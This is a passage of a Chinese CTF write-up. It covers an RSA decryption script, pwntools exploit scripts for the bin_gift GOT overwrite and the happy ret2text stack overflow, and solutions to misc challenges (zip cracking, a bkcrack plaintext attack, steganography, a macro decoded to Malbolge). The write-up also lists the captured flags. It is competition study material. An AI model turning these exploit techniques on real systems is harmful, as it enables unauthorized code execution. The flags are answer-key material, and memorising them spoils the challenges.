3449181446601397378968006674324753246013580929038935474151143294980592601911423698794436171646021633991328190789552835952437637863496011173604086905984318805710258969051632322326111378923301936151648733712292832400228718852555700089350581693206572448860973715415938816675920101336567495654357573191994730856103857549775016982813567025601029715927459867603513676152935188298681539416993775403152002836985599653470480800354152755275582198243528888697069870892345692931591655818148732228227890569700323009808337822568147429445530219871559528924454126891741517141491673059521896789132434077118608327133800491064640223646492279791064413028951228474075277822487467158841147454754127758427097085005104226495027785164273717534964
e = 65537

phi = p**4-p**3
d = gmpy2.invert(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
```

#### flag

flag{another_weird_construction}

## Pwn

### bin_gift

反编译可看到存在任意地址读写![bin_gift](https://img.jks.moe/od/01tklsjzgh7vchdwh3xneig5iexp6vr5zb)

用LibcSearcher计算得到system地址，修改got表

exp:

```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
p = process('./bin_gift')
# p = remote('38.47.122.46', 40002)
elf = ELF('./bin_gift')

printf_got = elf.got['printf']
print('printf_got: ', hex(printf_got))

p.recvuntil(b'he say fallow him can get good offer\n')
puts_addr = int(p.recvline().strip(), 16)
print('puts_addr: ', hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
print('system_addr: ', hex(system_addr))
p.sendlineafter(b'then?where what to read?\n', hex(printf_got)[2:].encode())
payload = p64(system_addr)
p.sendlineafter(b'now,patekb1ue will let you write sth,you want write what\n', payload)
p.interactive()
```

### happy

简单的ret2text，保护只开了NX。在`backdoor`函数存在栈溢出漏洞，可以控制跳转至`happy_new_yearrrrr`。经测试还需要补充一个ret才可以getshell

exp:

```python
from pwn import *

context.log_level = 'debug'
# p = remote("38.47.122.46",40018)
p = process("./happy")

ret = 0x000000000040101a

p.sendlineafter(b'now~input your wish~~~~OwO~~~~~\n', b'i want to be a good pwner!!!!!')
payload = b'a' * (0x30+8) + p64(ret) + p64(0x000000000040125B) + p64(0x00000000004012C0)
p.sendlineafter(b'yeah~~now show me your determination\n', payload)
p.interactive()
```

### try_nc

只允许执行两个字符长的命令，且会将'h'转为'b'。查阅Linux的命令就只有`su`可用。nc连上后执行相关命令。

## Misc

### zip_brute

根据题目名称进行压缩包密码爆破，爆出密码54123

#### flag

flag{you_are_go0o0o000000o00o00d_@_z1p_crack1ng}

### damaged zip

根据zip文件结构修复一下文件头和文件尾

#### flag

flag{z1p_format_n_rep4ir1ng_1s_1mp0rtant}

### magical

zip明文攻击。使用bkcrack将png文件头作为明文进行攻击，得到keys为`fa388c5d e3684f24 62ede265`，再将文件解出来

#### flag

flag{p1ain_texT_atTack_1s_s1mple_4_u}

### puzzling

把图片拼接起来解码即可

```python
from PIL import Image

def concatenate_images(output_path, rows, cols):
    first_image_path = 'imgs/1.png'
    small_image = Image.open(first_image_path)
    small_width, small_height = small_image.size
    large_width = small_width * cols
    large_height = small_height * rows
    large_image = Image.new('RGB', (large_width, large_height))
    for i in range(rows):
        for j in range(cols):
            image_number = i * cols + j + 1
            image_path = f'imgs/{image_number}.png'
            small_image = Image.open(image_path)
            large_image.paste(small_image, (j * small_width, i * small_height))
    large_image.save(output_path)
output_path = 'output_image.png'
concatenate_images(output_path, rows=8, cols=8)
```

#### flag

flag{puzz1e_qr_c0de_1s_veryyyyyyyyyyyyyy_1nterest1nggggggg}

### simple_jpg

图片最后面有附加数据，hex解码后为`youaresmart`。使用steghide解出隐写的文件

#### flag

flag{this_is_a_very_simple_steghide_jpg}

### sql_shark

追踪最后一个HTTP流即可

#### flag

flag{YOU_Found_1ttttttttt!!!}

### 热风

~~没有wps~~临时装一个用用。文档有宏，查看有base64编码，解码后得到一堆奇怪的字符串。复制第一行到Google，从一个reddit帖子得知是Malbolge语言，运行得到flag。

#### flag

flag{HAHAHA_you_h0v3_F0und_The_t3ue_Flag}

### what is my iphone number

DTMF识别：http://dialabc.com/sound/detect/index.html

根据hint，所有数字拼接在一起后使用塔珀公式![tupper](https://img.jks.moe/od/01tklsjzg7twhqptkwtfd2l4v56ptv2adn)

#### flag

flag{Xi_Xt_Good_job}
